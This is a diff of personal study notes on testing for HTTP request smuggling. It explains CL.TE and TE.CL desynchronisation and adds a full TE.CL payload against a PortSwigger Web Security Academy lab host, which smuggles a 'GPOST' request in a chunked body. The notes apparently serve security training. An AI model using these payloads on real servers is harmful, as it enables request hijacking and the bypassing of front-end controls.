@@ -1,10 +1,16 @@
 # HTTP Request smuggling Test
+**The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present. This technique is used by Burp Scanner to automate the detection of request smuggling vulnerabilities.**
+
+------
 
 ### headers
 
 ```
 Content-Length
-Transfer-Encoding
+```
+
+```
+Transfer-Encoding: chunked
 ```
 
 * CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
@@ -39,4 +45,21 @@ GET /404 HTTP/1.1
 X-Ignore: x
 ```
 
+#### need to include the trailing sequence ` \r\n\r\n ` following the final ` 0 `
+```
+POST / HTTP/1.1
+Host: 0ad900a9041522b281af1b0f001d00e3.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
 
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+```
